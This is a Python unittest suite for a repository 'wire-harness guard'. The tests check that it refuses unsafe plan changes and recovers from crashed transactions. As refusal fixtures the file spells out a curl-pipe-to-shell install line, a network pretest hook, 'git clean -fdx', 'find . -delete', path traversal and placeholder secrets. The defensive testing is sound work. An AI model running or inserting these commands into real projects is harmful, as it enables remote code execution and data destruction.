#!/usr/bin/env python3
"""Disposable-repository tests for the Hermes wire-harness guard."""

from __future__ import annotations

import contextlib
import fcntl
import hashlib
import importlib.util
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest


MODULE_PATH = Path(__file__).with_name("harness_guard.py")
SPEC = importlib.util.spec_from_file_location("harness_guard", MODULE_PATH)
assert SPEC and SPEC.loader
GUARD = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = GUARD
SPEC.loader.exec_module(GUARD)


class HarnessGuardTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory(prefix="sdd-wire-harness-test-")
        self.base = Path(self.temporary.name)
        self.root = self.base / "project"
        self.root.mkdir()
        self.previous_path = os.environ.get("PATH", "")
        self.tool_bin = self.base / "bin"
        self.tool_bin.mkdir()
        (self.tool_bin / "pnpm").write_text(
            "#!/bin/sh\necho node-gate\nexit 0\n", encoding="utf-8"
        )
        (self.tool_bin / "pnpm").chmod(0o755)
        os.environ["PATH"] = f"{self.tool_bin}{os.pathsep}{self.previous_path}"
        self.git("init", "-q")
        self.git("config", "user.email", "tests@example.invalid")
        self.git("config", "user.name", "SDD tests")
        self.add_full_stack_fixture()
        self.git("add", ".")
        self.git("commit", "-qm", "fixture")
        self.write_onboarding_artifacts()

    def tearDown(self) -> None:
        os.environ["PATH"] = self.previous_path
        self.temporary.cleanup()

    def git(self, *arguments: str) -> str:
        result = subprocess.run(
            ["git", "-C", str(self.root), *arguments],
            check=True,
            capture_output=True,
            text=True,
        )
        return result.stdout.strip()

    @property
    def head(self) -> str:
        return self.git("rev-parse", "HEAD")

    @property
    def git_dir(self) -> Path:
        return Path(self.git("rev-parse", "--absolute-git-dir"))

    @property
    def harness_paths(self) -> dict[str, Path]:
        _root, common = GUARD.resolve_project(str(self.root))
        return GUARD.technical_paths(self.root, common)

    def add_full_stack_fixture(self) -> None:
        backend = self.root / "backend"
        backend.mkdir()
        (backend / "pom.xml").write_text(
            """<project>
  <parent>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>4.0.1</version>
  </parent>
</project>
""",
            encoding="utf-8",
        )
        (backend / "mvnw").write_text("#!/bin/sh\necho maven-gate\nexit 0\n", encoding="utf-8")
        (backend / "mvnw").chmod(0o755)
        frontend = self.root / "frontend"
        frontend.mkdir()
        (frontend / "package.json").write_text(
            json.dumps(
                {
                    "packageManager": "pnpm@10.0.0",
                    "dependencies": {"next": "16.1.0", "react": "19.2.0"},
                    "scripts": {"build": "next build"},
                },
                indent=2,
            )
            + "\n",
            encoding="utf-8",
        )
        (frontend / "pnpm-lock.yaml").write_text(
            "lockfileVersion: '9.0'\n", encoding="utf-8"
        )
        (frontend / "node_modules").mkdir()
        (frontend / "node_modules/.ready").write_text("installed\n", encoding="utf-8")
        (self.root / ".gitignore").write_text("node_modules/\n", encoding="utf-8")

    def write_onboarding_artifacts(self, project: Path | None = None) -> None:
        project = project or self.root
        head = subprocess.run(
            ["git", "-C", str(project), "rev-parse", "HEAD"],
            check=True,
            capture_output=True,
            text=True,
        ).stdout.strip()
        git_dir = Path(
            subprocess.run(
                ["git", "-C", str(project), "rev-parse", "--absolute-git-dir"],
                check=True,
                capture_output=True,
                text=True,
            ).stdout.strip()
        )
        specs = project / ".specs"
        specs.mkdir(exist_ok=True)
        stack = {
            "schema_version": 1,
            "git_sha": head,
            "classification": "brownfield",
            "modules": [
                {
                    "path": "backend/pom.xml",
                    "module": "backend",
                    "kind": "spring",
                    "confidence": "proved",
                    "versions": {"spring_boot": "4.0.1"},
                    "evidence": ["backend/pom.xml"],
                },
                {
                    "path": "frontend/package.json",
                    "module": "frontend",
                    "kind": "nextjs",
                    "confidence": "proved",
                    "versions": {"next": "16.1.0"},
                    "package_manager": "pnpm",
                    "evidence": ["frontend/package.json"],
                },
            ],
            "confidence": {"level": "proved", "limitations": []},
        }
        contents = {
            "_stack.json": json.dumps(stack, indent=2).encode() + b"\n",
            "_baseline.json": json.dumps(
                {
                    "schema_version": 1,
                    "git_sha": head,
                    "status": "not-run",
                    "heavy_gates_executed": False,
                    "validation_commands": [],
                },
                indent=2,
            ).encode()
            + b"\n",
            "_starter-design.md": b"# Starter design\n",
            "_known-debt.md": b"# Known debt\n",
            "_onboarding.md": b"# Onboarding\n",
        }
        digest = hashlib.sha256()
        for name in GUARD.ONBOARDING_ARTIFACTS:
            data = contents[name]
            (specs / name).write_bytes(data)
            digest.update(name.encode())
            digest.update(b"\0")
            digest.update(GUARD.sha256(data).encode())
            digest.update(b"\0")
        receipt = {
            "version": 1,
            "operation": "commit-onboarding",
            "git_sha": head,
            "target_artifact_token": "sha256:" + digest.hexdigest(),
        }
        (git_dir / "sdd-onboarding.commit.json").write_text(
            json.dumps(receipt), encoding="utf-8"
        )

    def invoke(self, *arguments: str, expected: int = 0) -> dict:
        output = io.StringIO()
        with contextlib.redirect_stdout(output):
            result = GUARD.main(list(arguments))
        self.assertEqual(expected, result, output.getvalue())
        return json.loads(output.getvalue())

    def inspect(self, *, dry_run: bool = False, expected: int = 0) -> dict:
        arguments = ["inspect", "--project-root", str(self.root)]
        if dry_run:
            arguments.append("--dry-run")
        return self.invoke(*arguments, expected=expected)

    def candidates_and_plan(
        self,
        inspection: dict,
        *,
        targets: tuple[str, ...] = ("backend/pom.xml", "frontend/package.json"),
    ) -> tuple[Path, Path]:
        candidates = self.base / "candidates"
        candidates.mkdir(exist_ok=True)
        changes = []
        for relative in targets:
            source = self.root / relative
            before = source.read_bytes() if source.exists() else None
            if relative.endswith("pom.xml"):
                after = before.replace(b"</project>", b"  <build/>\n</project>")
                stack = "spring"
            elif relative.endswith("package.json"):
                package = json.loads(before)
                package["scripts"]["test"] = "vitest run"
                after = json.dumps(package, indent=2).encode() + b"\n"
                stack = "nextjs"
            elif relative.endswith("checkstyle.xml"):
                after = b"<?xml version=\"1.0\"?><module name=\"Checker\"/>\n"
                stack = "spring"
            else:
                after = b"#!/bin/sh\nset -eu\n"
                stack = "spring"
            destination = candidates / relative
            destination.parent.mkdir(parents=True, exist_ok=True)
            destination.write_bytes(after)
            change = {
                    "path": relative,
                    "candidate": relative,
                    "action": "replace" if before is not None else "create",
                    "stack": stack,
                    "purpose": "wire deterministic quality gates",
                    "expected_before_sha256": GUARD.sha256(before),
                    "expected_after_sha256": GUARD.sha256(after),
                }
            if relative.endswith("package.json"):
                change["approved_additions"] = ["$.scripts.test"]
                change["approval_evidence"] = "user:test fixture approval"
            changes.append(change)
        plan = {
            "schema_version": 1,
            "git_sha": inspection["git_sha"],
            "snapshot_token": inspection["snapshot_token"],
            "feature_id": None,
            "changes": changes,
            "validation": [
                {
                    "stack": stack,
                    "phase": phase,
                    "argv": ["./mvnw", "--offline", "verify"]
                    if stack == "spring"
                    else [
                        "pnpm",
                        "test" if "frontend/package.json" in targets else "build",
                    ],
                    "working_directory": "backend" if stack == "spring" else "frontend",
                    "timeout_seconds": 30,
                }
                for phase in ("pre-commit", "post-commit")
                for stack in ("spring", "nextjs")
            ],
        }
        plan_path = candidates / "plan.json"
        plan_path.write_text(json.dumps(plan, indent=2) + "\n", encoding="utf-8")
        return candidates, plan_path

    def validate(
        self,
        inspection: dict,
        candidates: Path,
        plan: Path,
        *,
        dry_run: bool = True,
        expected: int = 0,
    ) -> dict:
        arguments = [
            "validate",
            "--project-root",
            str(self.root),
            "--expected-head",
            inspection["git_sha"],
            "--expected-token",
            inspection["snapshot_token"],
            "--plan",
            str(plan),
            "--candidate-dir",
            str(candidates),
        ]
        if dry_run:
            arguments.append("--dry-run")
        return self.invoke(*arguments, expected=expected)

    def commit(self, inspection: dict, candidates: Path, plan: Path, expected: int = 0) -> dict:
        return self.invoke(
            "commit",
            "--project-root",
            str(self.root),
            "--expected-head",
            inspection["git_sha"],
            "--expected-token",
            inspection["snapshot_token"],
            "--plan",
            str(plan),
            "--candidate-dir",
            str(candidates),
            expected=expected,
        )

    def test_dry_run_detects_proved_stacks_and_writes_nothing(self) -> None:
        before = self.git("status", "--porcelain=v1", "--untracked-files=all")
        lock = self.git_dir / "sdd-wire-harness.lock"

        inspection = self.inspect(dry_run=True)

        self.assertEqual(["spring", "nextjs"], [item["stack"] for item in inspection["stacks"]])
        self.assertFalse(lock.exists())
        self.assertEqual(before, self.git("status", "--porcelain=v1", "--untracked-files=all"))

    def test_validate_dry_run_returns_structured_plan_without_writes(self) -> None:
        inspection = self.inspect(dry_run=True)
        candidates, plan = self.candidates_and_plan(inspection)
        before_pom = (self.root / "backend/pom.xml").read_bytes()

        result = self.validate(inspection, candidates, plan)

        self.assertEqual("validated", result["status"])
        self.assertTrue(result["dry_run"])
        self.assertEqual(2, len(result["changes"]))
        self.assertEqual(before_pom, (self.root / "backend/pom.xml").read_bytes())
        self.assertFalse((self.git_dir / "sdd-wire-harness.lock").exists())

    def test_commit_is_transactional_and_same_plan_is_idempotent(self) -> None:
        inspection = self.inspect()
        candidates, plan = self.candidates_and_plan(inspection)

        first = self.commit(inspection, candidates, plan)
        second = self.commit(inspection, candidates, plan)

        self.assertFalse(first["unchanged"])
        self.assertTrue(second["unchanged"])
        self.assertEqual(4, len(first["gates"]))
        self.assertTrue(all(gate["output_sha256"] != GUARD.sha256(b"") for gate in first["gates"]))
        self.assertIn(b"<build", (self.root / "backend/pom.xml").read_bytes())
        self.assertIn("vitest run", (self.root / "frontend/package.json").read_text())
        self.assertFalse(self.harness_paths["journal"].exists())

    def test_idempotent_replay_stays_under_global_lock(self) -> None:
        inspection = self.inspect()
        candidates, plan = self.candidates_and_plan(inspection)
        self.commit(inspection, candidates, plan)
        lock_path = self.harness_paths["lock"]
        descriptor = os.open(lock_path, os.O_RDWR)
        try:
            fcntl.flock(descriptor, fcntl.LOCK_EX | fcntl.LOCK_NB)
            result = self.commit(inspection, candidates, plan, expected=2)
        finally:
            os.close(descriptor)
        self.assertIn("holds the lock", result["error"])

    def test_scope_glob_symlink_and_secret_are_refused(self) -> None:
        inspection = self.inspect(dry_run=True)
        candidates, plan_path = self.candidates_and_plan(inspection)
        plan = json.loads(plan_path.read_text())
        plan["changes"][0]["path"] = "backend/src/**/App.java"
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        self.assertEqual("refused", self.validate(inspection, candidates, plan_path, expected=2)["status"])

        candidates, plan_path = self.candidates_and_plan(inspection, targets=("backend/checkstyle.xml",))
        target = candidates / "backend/checkstyle.xml"
        target.unlink()
        target.symlink_to(self.root / "backend/pom.xml")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertEqual("refused", result["status"])
        self.assertIn("symbolic", result["error"])

        target.unlink()
        target.write_text("<module name=\"Checker\"><property name=\"token\" value=\"ghp_abcdefghijklmnopqrstuvwxyz\"/></module>")
        plan = json.loads(plan_path.read_text())
        plan["changes"][0]["expected_after_sha256"] = GUARD.sha256(target.read_bytes())
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("secret", result["error"])

    def test_unrelated_workspace_change_is_refused(self) -> None:
        (self.root / "user-note.txt").write_text("preserve me\n", encoding="utf-8")
        result = self.inspect(dry_run=True, expected=2)
        self.assertIn("outside", result["error"])
        self.assertEqual("preserve me\n", (self.root / "user-note.txt").read_text())

    def test_existing_pom_and_package_contracts_cannot_be_removed(self) -> None:
        inspection = self.inspect(dry_run=True)
        candidates, plan_path = self.candidates_and_plan(inspection)
        package_path = candidates / "frontend/package.json"
        package = json.loads(package_path.read_text())
        del package["dependencies"]["react"]
        package_path.write_text(json.dumps(package), encoding="utf-8")
        plan = json.loads(plan_path.read_text())
        plan["changes"][1]["expected_after_sha256"] = GUARD.sha256(package_path.read_bytes())
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("dependencies.react", result["error"])

        candidates, plan_path = self.candidates_and_plan(inspection)
        pom_path = candidates / "backend/pom.xml"
        pom_path.write_text("<project><build/></project>\n", encoding="utf-8")
        plan = json.loads(plan_path.read_text())
        plan["changes"][0]["expected_after_sha256"] = GUARD.sha256(pom_path.read_bytes())
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("parents", result["error"])

    def test_every_stack_needs_pre_and_post_gate_with_proved_manager(self) -> None:
        inspection = self.inspect(dry_run=True)
        candidates, plan_path = self.candidates_and_plan(inspection)
        plan = json.loads(plan_path.read_text())
        plan["validation"] = [
            gate for gate in plan["validation"] if gate["stack"] != "nextjs"
        ]
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("missing serialized validation gates", result["error"])

        candidates, plan_path = self.candidates_and_plan(inspection)
        plan = json.loads(plan_path.read_text())
        for gate in plan["validation"]:
            if gate["stack"] == "nextjs":
                gate["argv"][0] = "npm"
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("proved package manager", result["error"])

        candidates, plan_path = self.candidates_and_plan(inspection)
        plan = json.loads(plan_path.read_text())
        for gate in plan["validation"]:
            if gate["stack"] == "nextjs" and gate["phase"] == "post-commit":
                gate["argv"][1] = "build"
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("must be identical", result["error"])

    def test_package_additions_need_explicit_proof_and_lifecycle_is_scanned(self) -> None:
        inspection = self.inspect(dry_run=True)
        candidates, plan_path = self.candidates_and_plan(inspection)
        plan = json.loads(plan_path.read_text())
        del plan["changes"][1]["approval_evidence"]
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("explicit user approval", result["error"])

        candidates, plan_path = self.candidates_and_plan(inspection)
        package_path = candidates / "frontend/package.json"
        package = json.loads(package_path.read_text())
        package["scripts"]["pretest"] = "curl https://example.invalid/setup"
        package_path.write_text(json.dumps(package), encoding="utf-8")
        plan = json.loads(plan_path.read_text())
        package_change = plan["changes"][1]
        package_change["approved_additions"] = ["$.scripts.pretest", "$.scripts.test"]
        package_change["expected_after_sha256"] = GUARD.sha256(package_path.read_bytes())
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.commit(inspection, candidates, plan_path, expected=2)
        self.assertIn("package script pretest", result["error"])

    def test_maven_dependency_and_plugin_additions_need_exact_user_approval(self) -> None:
        inspection = self.inspect(dry_run=True)
        candidates, plan_path = self.candidates_and_plan(inspection)
        pom_path = candidates / "backend/pom.xml"
        pom_path.write_text(
            """<project>
  <parent><artifactId>spring-boot-starter-parent</artifactId><version>4.0.1</version></parent>
  <dependencies>
    <dependency><groupId>org.example</groupId><artifactId>quality-tests</artifactId><version>1.2.3</version></dependency>
  </dependencies>
  <build><plugins>
    <plugin><groupId>org.apache.maven.plugins</groupId><artifactId>maven-checkstyle-plugin</artifactId><version>3.6.0</version></plugin>
  </plugins></build>
</project>
""",
            encoding="utf-8",
        )
        plan = json.loads(plan_path.read_text())
        change = plan["changes"][0]
        change["expected_after_sha256"] = GUARD.sha256(pom_path.read_bytes())
        plan_path.write_text(json.dumps(plan), encoding="utf-8")

        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("Maven dependency/plugin additions require an exact", result["error"])

        change["approved_additions"] = [
            "maven.dependencies[org.example:quality-tests:1.2.3]",
            "maven.plugins[org.apache.maven.plugins:maven-checkstyle-plugin:3.6.0]",
        ]
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("explicit user approval evidence", result["error"])

        change["approval_evidence"] = "user:approve the two exact Maven coordinates"
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        self.assertEqual("validated", self.validate(inspection, candidates, plan_path)["status"])

    def test_gate_allowlist_refuses_interpreters_mutators_network_and_absolute_paths(self) -> None:
        inspection = self.inspect(dry_run=True)
        unsafe_scripts = (
            "python -c 'open(\"/tmp/out\", \"w\").write(\"x\")'",
            "node -e 'require(\"fs\").writeFileSync(\"/tmp/out\", \"x\")'",
            "git clean -fdx",
            "find . -delete",
            "vitest run https://example.invalid/spec.ts",
            "vitest run /tmp/spec.ts",
            "vitest run ../outside/spec.ts",
        )
        for unsafe in unsafe_scripts:
            with self.subTest(script=unsafe):
                candidates, plan_path = self.candidates_and_plan(inspection)
                package_path = candidates / "frontend/package.json"
                package = json.loads(package_path.read_text())
                package["scripts"]["test"] = unsafe
                package_path.write_text(json.dumps(package), encoding="utf-8")
                plan = json.loads(plan_path.read_text())
                plan["changes"][1]["expected_after_sha256"] = GUARD.sha256(
                    package_path.read_bytes()
                )
                plan_path.write_text(json.dumps(plan), encoding="utf-8")
                result = self.commit(inspection, candidates, plan_path, expected=2)
                self.assertRegex(result["error"], "allowlist|shell|absolute|network")

        candidates, plan_path = self.candidates_and_plan(inspection)
        plan = json.loads(plan_path.read_text())
        for gate in plan["validation"]:
            if gate["stack"] == "nextjs":
                gate["argv"] = ["pnpm", "run", "test", "--", "/tmp/spec.ts"]
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertRegex(result["error"], "absolute|configured gate")

    def test_xml_and_javascript_secret_forms_are_refused(self) -> None:
        inspection = self.inspect(dry_run=True)
        candidates, plan_path = self.candidates_and_plan(
            inspection, targets=("backend/checkstyle.xml",)
        )
        xml_path = candidates / "backend/checkstyle.xml"
        xml_path.write_text(
            '<module name="Checker"><property value="supersecretvalue" name="token"/></module>',
            encoding="utf-8",
        )
        plan = json.loads(plan_path.read_text())
        plan["changes"][0]["expected_after_sha256"] = GUARD.sha256(xml_path.read_bytes())
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("XML secret", result["error"])

        candidates = self.base / "js-candidates"
        candidate_path = candidates / "frontend/vitest.config.ts"
        candidate_path.parent.mkdir(parents=True)
        candidate_path.write_text('const apiKey = "abcdefghijk-secret";\n', encoding="utf-8")
        plan = {
            "schema_version": 1,
            "git_sha": inspection["git_sha"],
            "snapshot_token": inspection["snapshot_token"],
            "feature_id": None,
            "changes": [
                {
                    "path": "frontend/vitest.config.ts",
                    "candidate": "frontend/vitest.config.ts",
                    "action": "create",
                    "stack": "nextjs",
                    "purpose": "configure tests",
                    "expected_before_sha256": "absent",
                    "expected_after_sha256": GUARD.sha256(candidate_path.read_bytes()),
                }
            ],
            "validation": [
                {
                    "stack": stack,
                    "phase": phase,
                    "argv": ["./mvnw", "--offline", "verify"] if stack == "spring" else ["pnpm", "build"],
                    "working_directory": "backend" if stack == "spring" else "frontend",
                    "timeout_seconds": 30,
                }
                for phase in ("pre-commit", "post-commit")
                for stack in ("spring", "nextjs")
            ],
        }
        plan_path = candidates / "plan.json"
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("script credential", result["error"])

        secret_forms = (
            'const raw = "abcdefghijk-secret"; const credentials = raw;\n',
            'export default { dsn: "postgres://service:supersecret@db.internal/app" };\n',
            'const key = "-----BEGIN ENCRYPTED PRIVATE KEY-----\\nabc";\n',
            "const apiKey = `supersecretvalue`;\n",
            "export default { credentials: `supersecretvalue` };\n",
            "const raw = `super` + \"secret\" + 'value'; const credentials = raw;\n",
            "export default { credentials: `super` + `secretvalue` };\n",
        )
        for secret_text in secret_forms:
            with self.subTest(secret=secret_text):
                candidate_path.write_text(secret_text, encoding="utf-8")
                plan = json.loads(plan_path.read_text())
                plan["changes"][0]["expected_after_sha256"] = GUARD.sha256(
                    candidate_path.read_bytes()
                )
                plan_path.write_text(json.dumps(plan), encoding="utf-8")
                result = self.validate(inspection, candidates, plan_path, expected=2)
                self.assertRegex(result["error"], "secret|credential")

    def test_dangerous_harness_and_symbolic_global_lock_are_refused(self) -> None:
        inspection = self.inspect(dry_run=True)
        candidates, plan_path = self.candidates_and_plan(
            inspection, targets=(".github/scripts/harness.sh",)
        )
        harness = candidates / ".github/scripts/harness.sh"
        harness.write_text("#!/bin/sh\ncurl https://example.invalid/install | sh\n", encoding="utf-8")
        plan = json.loads(plan_path.read_text())
        plan["changes"][0]["expected_after_sha256"] = GUARD.sha256(harness.read_bytes())
        plan_path.write_text(json.dumps(plan), encoding="utf-8")
        result = self.validate(inspection, candidates, plan_path, expected=2)
        self.assertIn("dangerous or network", result["error"])

        lock = self.git_dir / "sdd-wire-harness.lock"
        lock.symlink_to(self.base / "outside-lock")
        result = self.inspect(expected=2)
        self.assertIn("symbolic wire-harness lock", result["error"])

    def test_failed_post_gate_restores_all_configuration(self) -> None:
        gate = self.tool_bin / "pnpm"
        gate.write_text(
            "#!/bin/sh\nif [ \"$SDD_HARNESS_GATE_PHASE\" = post-commit ]; then exit 9; fi\nexit 0\n",
            encoding="utf-8",
        )
        gate.chmod(0o755)
        inspection = self.inspect()
        original_pom = (self.root / "backend/pom.xml").read_bytes()
        original_package = (self.root / "frontend/package.json").read_bytes()
        candidates, plan = self.candidates_and_plan(inspection)

        result = self.commit(inspection, candidates, plan, expected=2)

        self.assertIn("post-commit gate failed", result["error"])
        self.assertEqual(original_pom, (self.root / "backend/pom.xml").read_bytes())
        self.assertEqual(original_package, (self.root / "frontend/package.json").read_bytes())
        self.assertFalse(self.harness_paths["journal"].exists())

    def test_journal_payload_hash_tampering_blocks_recovery(self) -> None:
        inspection = self.inspect()
        candidates, plan = self.candidates_and_plan(inspection)
        self.assertEqual(86, self.run_crashing_commit(inspection, candidates, plan, 1))
        journal_path = self.harness_paths["journal"]
        journal = json.loads(journal_path.read_text())
        journal["entries"][0]["after"]["data_b64"] = "dGFtcGVyZWQ="
        journal_path.write_text(json.dumps(journal), encoding="utf-8")

        result = self.inspect(expected=2)

        self.assertIn("payload hash is invalid", result["error"])

    def test_recovery_refuses_hash_valid_target_outside_stack_allowlist(self) -> None:
        inspection = self.inspect()
        candidates, plan = self.candidates_and_plan(inspection)
        self.assertEqual(86, self.run_crashing_commit(inspection, candidates, plan, 1))
        journal_path = self.harness_paths["journal"]
        journal = json.loads(journal_path.read_text())
        payload = (self.root / ".gitignore").read_bytes()
        entry = journal["entries"][0]
        entry.update(
            {
                "path": ".gitignore",
                "absolute_path": str((self.root / ".gitignore").resolve()),
                "stack": "spring",
                "before": GUARD.encode_payload(payload, 0o644),
                "before_sha256": GUARD.sha256(payload),
                "after": GUARD.encode_payload(payload, 0o644),
                "after_sha256": GUARD.sha256(payload),
                "created_parents": [],
            }
        )
        journal_path.write_text(json.dumps(journal), encoding="utf-8")

        result = self.inspect(expected=2)

        self.assertIn("outside the current stack allowlist", result["error"])

    def test_lock_is_shared_by_linked_worktrees(self) -> None:
        linked = self.base / "linked"
        self.git("worktree", "add", "-q", "-b", "linked-test", str(linked), "HEAD")
        _root, main_common = GUARD.resolve_project(str(self.root))
        _linked_root, linked_common = GUARD.resolve_project(str(linked))
        self.assertEqual(main_common, linked_common)
        self.assertEqual(
            GUARD.technical_paths(self.root, main_common)["lock"],
            GUARD.technical_paths(linked, linked_common)["lock"],
        )

    def test_receipts_and_replays_are_isolated_between_two_worktrees(self) -> None:
        main_inspection = self.inspect()
        main_candidates, main_plan = self.candidates_and_plan(main_inspection)
        self.commit(main_inspection, main_candidates, main_plan)
        main_paths = self.harness_paths

        linked = self.base / "linked-commit"
        self.git("worktree", "add", "-q", "-b", "linked-commit-test", str(linked), "HEAD")
        (linked / "frontend/node_modules").mkdir(parents=True)
        (linked / "frontend/node_modules/.ready").write_text("installed\n", encoding="utf-8")
        self.write_onboarding_artifacts(linked)
        linked_inspection = self.invoke(
            "inspect", "--project-root", str(linked)
        )
        candidates = self.base / "linked-candidates"
        candidate = candidates / "backend/checkstyle.xml"
        candidate.parent.mkdir(parents=True)
        candidate.write_text('<module name="Checker"/>\n', encoding="utf-8")
        linked_plan = {
            "schema_version": 1,
            "git_sha": linked_inspection["git_sha"],
            "snapshot_token": linked_inspection["snapshot_token"],
            "feature_id": None,
            "changes": [
                {
                    "path": "backend/checkstyle.xml",
                    "candidate": "backend/checkstyle.xml",
                    "action": "create",
                    "stack": "spring",
                    "purpose": "linked worktree harness",
                    "expected_before_sha256": "absent",
                    "expected_after_sha256": GUARD.sha256(candidate.read_bytes()),
                }
            ],
            "validation": [
                {
                    "stack": stack,
                    "phase": phase,
                    "argv": ["./mvnw", "--offline", "verify"] if stack == "spring" else ["pnpm", "build"],
                    "working_directory": "backend" if stack == "spring" else "frontend",
                    "timeout_seconds": 30,
                }
                for phase in ("pre-commit", "post-commit")
                for stack in ("spring", "nextjs")
            ],
        }
        linked_plan_path = candidates / "plan.json"
        linked_plan_path.write_text(json.dumps(linked_plan), encoding="utf-8")
        commit_arguments = (
            "commit",
            "--project-root",
            str(linked),
            "--expected-head",
            linked_inspection["git_sha"],
            "--expected-token",
            linked_inspection["snapshot_token"],
            "--plan",
            str(linked_plan_path),
            "--candidate-dir",
            str(candidates),
        )
        first = self.invoke(*commit_arguments)
        replay = self.invoke(*commit_arguments)
        _linked_root, linked_common = GUARD.resolve_project(str(linked))
        linked_paths = GUARD.technical_paths(linked, linked_common)

        self.assertFalse(first["unchanged"])
        self.assertTrue(replay["unchanged"])
        self.assertNotEqual(main_paths["receipt"], linked_paths["receipt"])
        self.assertTrue(main_paths["receipt"].is_file())
        self.assertTrue(linked_paths["receipt"].is_file())

    def run_crashing_commit(self, inspection: dict, candidates: Path, plan: Path, crash_after: int) -> int:
        environment = os.environ.copy()
        environment["SDD_WIRE_HARNESS_CRASH_AFTER_REPLACE"] = str(crash_after)
        result = subprocess.run(
            [
                sys.executable,
                str(MODULE_PATH),
                "commit",
                "--project-root",
                str(self.root),
                "--expected-head",
                inspection["git_sha"],
                "--expected-token",
                inspection["snapshot_token"],
                "--plan",
                str(plan),
                "--candidate-dir",
                str(candidates),
            ],
            check=False,
            capture_output=True,
            env=environment,
        )
        self.last_crash_output = (result.stdout + result.stderr).decode(
            "utf-8", "replace"
        )
        return result.returncode

    def test_crash_mid_transaction_rolls_back_on_recovery(self) -> None:
        inspection = self.inspect()
        original_pom = (self.root / "backend/pom.xml").read_bytes()
        original_package = (self.root / "frontend/package.json").read_bytes()
        candidates, plan = self.candidates_and_plan(inspection)

        self.assertEqual(
            86,
            self.run_crashing_commit(inspection, candidates, plan, 1),
            self.last_crash_output,
        )
        recovered = self.inspect()

        self.assertEqual("rolled-back", recovered["recovery"])
        self.assertEqual(original_pom, (self.root / "backend/pom.xml").read_bytes())
        self.assertEqual(original_package, (self.root / "frontend/package.json").read_bytes())

    def test_recovery_namespace_survives_branch_and_head_changes(self) -> None:
        inspection = self.inspect()
        original_pom = (self.root / "backend/pom.xml").read_bytes()
        original_package = (self.root / "frontend/package.json").read_bytes()
        candidates, plan = self.candidates_and_plan(inspection)
        paths_before = self.harness_paths

        self.assertEqual(86, self.run_crashing_commit(inspection, candidates, plan, 1))
        self.git("checkout", "-qb", "recovery-renamed")
        self.git("commit", "--allow-empty", "-qm", "advance head during recovery")
        paths_after = self.harness_paths

        self.assertEqual(paths_before["journal"], paths_after["journal"])
        self.assertTrue(paths_after["journal"].is_file())
        self.assertEqual("rolled-back", GUARD.recover(self.root, paths_after, dry_run=False))
        self.assertEqual(original_pom, (self.root / "backend/pom.xml").read_bytes())
        self.assertEqual(original_package, (self.root / "frontend/package.json").read_bytes())

    def test_recovery_removes_transaction_created_parent_directories(self) -> None:
        inspection = self.inspect()
        candidates, plan = self.candidates_and_plan(
            inspection, targets=("backend/config/checkstyle/checkstyle.xml",)
        )

        self.assertEqual(
            86,
            self.run_crashing_commit(inspection, candidates, plan, 1),
            self.last_crash_output,
        )
        recovered = self.inspect()

        self.assertEqual("rolled-back", recovered["recovery"])
        self.assertFalse((self.root / "backend/config").exists())

    def test_crash_after_last_replace_rolls_back_without_post_gates(self) -> None:
        inspection = self.inspect()
        original_pom = (self.root / "backend/pom.xml").read_bytes()
        original_package = (self.root / "frontend/package.json").read_bytes()
        candidates, plan = self.candidates_and_plan(inspection)

        self.assertEqual(86, self.run_crashing_commit(inspection, candidates, plan, 2))
        recovered = self.inspect()

        self.assertEqual("rolled-back", recovered["recovery"])
        self.assertEqual(original_pom, (self.root / "backend/pom.xml").read_bytes())
        self.assertEqual(original_package, (self.root / "frontend/package.json").read_bytes())


if __name__ == "__main__":
    unittest.main()
